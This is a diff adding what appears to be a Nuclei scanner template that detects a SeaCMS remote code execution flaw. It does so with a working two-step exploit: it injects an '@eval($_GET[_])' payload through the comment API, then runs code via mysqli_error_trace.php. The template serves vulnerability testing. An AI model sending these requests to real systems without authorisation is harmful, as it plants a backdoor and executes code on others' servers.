@@ -1,0 +1,38 @@
+id: seacms-comment-api-index-php-rce
+info:
+  name: SeaCMS Comment API Index RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Detects remote code execution vulnerability in SeaCMS versions before v9.9.2 via the comment API index.php file.
+  reference:
+    - https://www.zhihuifly.com/t/topic/3118
+http:
+  - raw:
+      - |
+        GET /comment/api/index.php?gid=1&page=2&rlist[]=*hex/@eval($_GET[_])%3B%3F%3E HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: random_value
+        internal: true
+        part: body
+        regex:
+          - "([a-fA-F0-9]{32})"
+  - raw:
+      - |
+        GET /data/mysqli_error_trace.php?_=printf(md5("{{random_value}}"))%3B HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "([a-fA-F0-9]{32})"
